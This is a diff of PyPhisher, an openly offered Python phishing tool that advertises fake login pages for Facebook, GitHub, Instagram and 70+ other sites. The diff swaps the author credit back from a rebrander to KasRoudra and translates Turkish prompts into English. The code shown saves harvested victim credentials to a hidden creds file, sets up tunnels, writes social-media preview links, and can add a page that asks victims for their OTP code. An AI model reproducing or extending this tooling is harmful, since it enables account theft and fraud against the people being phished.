@@ -1,11 +1,11 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : PyPhisher
-# Author     : ZioN
+# Author     : KasRoudra
 # Version    : 2.1
 # License    : MIT
-# Copyright  : ZioN (2021-2023)
-# Github     : https://github.com/Zion1TECH
-# Contact    : https://www.instagram.com/emir.kanlioglu/?igsh=MzNlNGNkZWQ4Mg%3D%3D
+# Copyright  : KasRoudra (2021-2023)
+# Github     : https://github.com/KasRoudra
+# Contact    : https://t.me/KasRoudra
 # Description: PyPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
 # 1st Commit : 08/08/2021
@@ -270,7 +270,7 @@ else:
     saved_file = f"{home}/.creds.txt"
 
 
-print(f"\n{info}BEKLE Bİ AQ{nc}")
+print(f"\n{info}Please wait!{nc}")
 
 argparser = ArgumentParser()
 
@@ -721,8 +721,7 @@ def write_meta():
         return
     while True:
         if url is None or url == "":
-            metaurl = input(f"\n{ask}{bcyan}Gölge URL'sini girin{green}({blue}sosyal medya önizlemesi için{green})
-atlamak için enter tuşuna basın{bcyan}] : {green}")
+            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
         else:
             metaurl = url
         if metaurl=="":
@@ -823,7 +822,7 @@ def lx_token():
         status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
         if not "error" in status:
             break
-        has_token = input(f"\n{ask}GİRİŞ BİLETİN VAR MI ? Y/N {green}")
+        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
         if has_token == "y":
             shell(f"{lx_command} account login")
             break
@@ -1227,7 +1226,7 @@ def requirements():
         if "@gmail.com" in email:
             is_mail_ok = True
         else:
-            print(f"\n{error}Yalnızca uygulama şifresi olan Gmail'e izin verilir!{nc}")
+            print(f"\n{error}Only gmail with app password is allowed!{nc}")
             sleep(1)
 
 # Main Menu to choose phishing type
@@ -1260,7 +1259,7 @@ def main_menu():
         elif mode == "test":
             choice = default_template
         else:
-            choice = input(f"{ask} Seçeneklerden birini seçin : {green}")
+            choice = input(f"{ask}Select one of the options > {green}")
         if choice != "0" and choice.startswith("0"):
             choice = choice.replace("0", "")
         if choice in choices:
@@ -1275,7 +1274,7 @@ def main_menu():
             if folder == "custom" and mask == "custom":
                 customdir = customfol()
             if otp_folder != "":
-                is_otp = input(f"\n{ask}KURBANA OTP ŞİFESİ SORULSUN MU ? Y/N {green}")
+                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
                 if is_otp == "y":
                     folder = otp_folder
             break
